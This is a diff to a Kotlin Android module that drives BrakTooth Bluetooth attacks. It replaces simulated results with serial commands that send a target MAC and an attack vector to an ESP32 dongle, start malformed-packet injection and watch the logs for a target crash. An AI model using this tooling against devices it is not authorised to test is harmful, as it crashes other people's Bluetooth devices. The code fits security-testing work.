@@ -1,8 +1,10 @@
 package com.hereliesaz.blusnu.data
 
-import kotlinx.coroutines.delay
+import android.util.Log
 import kotlinx.coroutines.flow.Flow
 import kotlinx.coroutines.flow.flow
+import kotlinx.coroutines.flow.first
+import kotlinx.coroutines.withTimeoutOrNull
 
 /**
  * Enumeration of supported BrakTooth attack vectors.
@@ -21,29 +23,39 @@ enum class BrakToothVector(val description: String) {
 /**
  * Implementation of the BrakTooth fuzzing module.
  *
- * <p>
- * Because BrakTooth relies on exploiting low-level Link Manager Protocol (LMP) timing and state machine flaws,
- * it requires a dedicated hardware controller (typically an ESP32 or specialized dongle) to inject the malformed packets.
+ * BrakTooth relies on exploiting low-level Link Manager Protocol (LMP) timing
+ * and state machine flaws. It requires a dedicated hardware controller (typically
+ * an ESP32 or specialized dongle) connected via USB serial to inject malformed packets.
  * Standard Android Bluetooth hardware cannot generate these invalid frames.
- * </p>
  *
- * This module manages the communication with the external hardware (simulated for now) and the attack workflow.
+ * This module communicates with the external ESP32 hardware through [HardwareManager].
+ *
+ * @property hardwareManager Interface to the USB serial hardware.
  */
-class BrakToothModule {
+class BrakToothModule(private val hardwareManager: HardwareManager) {
 
-    /**
-     * Checks for the presence of the required external hardware (e.g., ESP32 connected via OTG).
-     *
-     * @return true if the hardware is detected and initialized.
-     */
-    suspend fun checkHardware(): Boolean {
-        delay(1000) // Simulate time taken for USB enumeration
-        // Simulation: 80% chance of finding the dongle for demo purposes
-        return (1..10).random() > 2
+    companion object {
+        private const val TAG = "BrakToothModule"
+        private const val HARDWARE_CHECK_TIMEOUT_MS = 5_000L
+        private const val FUZZING_PHASE_TIMEOUT_MS = 30_000L
     }
 
     /**
-     * Starts the fuzzing attack sequence.
+     * Checks for the presence of the required external hardware by inspecting
+     * the current hardware connection state.
+     *
+     * @return true if hardware is connected and ready.
+     */
+    suspend fun checkHardware(): Boolean {
+        val state = hardwareManager.hardwareState.value
+        return state == HardwareState.CONNECTED_BTLEJACK || state == HardwareState.CONNECTED_DUAL
+    }
+
+    /**
+     * Starts the fuzzing attack sequence against the target device using the selected vector.
+     *
+     * Sends serial commands to the ESP32 firmware and parses real output from
+     * [HardwareManager.deviceLogs] for progress and results.
      *
      * @param targetDevice The target Bluetooth device.
      * @param vector The specific BrakTooth vulnerability to exploit.
@@ -54,38 +66,57 @@ class BrakToothModule {
         emit("Target: ${targetDevice.name ?: targetDevice.macAddress}")
         emit("Vector: ${vector.name}")
 
-        // Attempt to connect to the external ESP32 dongle via Serial.
-        delay(800)
-        // In a real implementation, this would open a serial connection (UsbSerial) to the dongle
-        emit("Connecting to ESP32 firmware via /dev/ttyUSB0...")
+        // Step 1: Set the target MAC address on the ESP32
+        hardwareManager.sendCommand("target ${targetDevice.macAddress}")
+        emit("Sent target command: ${targetDevice.macAddress}")
 
-        delay(800)
-        emit("ESP32: Firmware v1.0.4 (BrakTooth Patched) Ready.")
+        // Step 2: Select the attack vector
+        hardwareManager.sendCommand("vector ${vector.name}")
+        emit("Sent vector command: ${vector.name}")
 
-        // Synchronize with the target's frequency hopping sequence.
-        delay(1000)
-        emit("Syncing with target clock (Page Scan)...")
-
-        delay(1500)
-        emit("Target locked. RSSI: -45dBm")
-
-        delay(500)
+        // Step 3: Start the fuzzing sequence
+        hardwareManager.sendCommand("start")
         emit("Starting injection sequence: ${vector.description}")
 
-        // Simulate the packet injection loop where the dongle sends malformed LMP frames
-        for (i in 1..5) {
-            delay(600)
-            emit("Injecting Malformed Packet batch #$i/5...")
+        // Step 4: Collect real output from the hardware and relay to the UI
+        var crashDetected = false
+        var sessionComplete = false
+
+        val result = withTimeoutOrNull(FUZZING_PHASE_TIMEOUT_MS) {
+            hardwareManager.deviceLogs.first { logLine ->
+                // Relay all output lines from the hardware
+                emit(logLine)
+
+                when {
+                    logLine.contains("CRASH", ignoreCase = true) -> {
+                        crashDetected = true
+                        sessionComplete = true
+                    }
+                    logLine.contains("complete", ignoreCase = true) ||
+                    logLine.contains("finished", ignoreCase = true) ||
+                    logLine.contains("done", ignoreCase = true) -> {
+                        sessionComplete = true
+                    }
+                    logLine.contains("timeout", ignoreCase = true) -> {
+                        sessionComplete = true
+                    }
+                    logLine.contains("injecting", ignoreCase = true) -> {
+                        // Progress indicator -- keep listening
+                    }
+                }
+
+                sessionComplete
+            }
         }
 
-        delay(1000)
-        // Check if the target is still responding to determine if a crash occurred.
-        val crashDetected = (1..100).random() > 40 // 60% success rate simulation
+        if (result == null && !sessionComplete) {
+            emit("Fuzzing timed out after ${FUZZING_PHASE_TIMEOUT_MS / 1000}s.")
+        }
 
         if (crashDetected) {
-            emit("CRASH DETECTED: Target stopped responding to L2CAP pings.")
+            emit("CRASH DETECTED: Target stopped responding.")
             emit("Vulnerability Confirmed: ${vector.name}")
-        } else {
+        } else if (!crashDetected && sessionComplete) {
             emit("Target resilient. No crash detected.")
         }
 
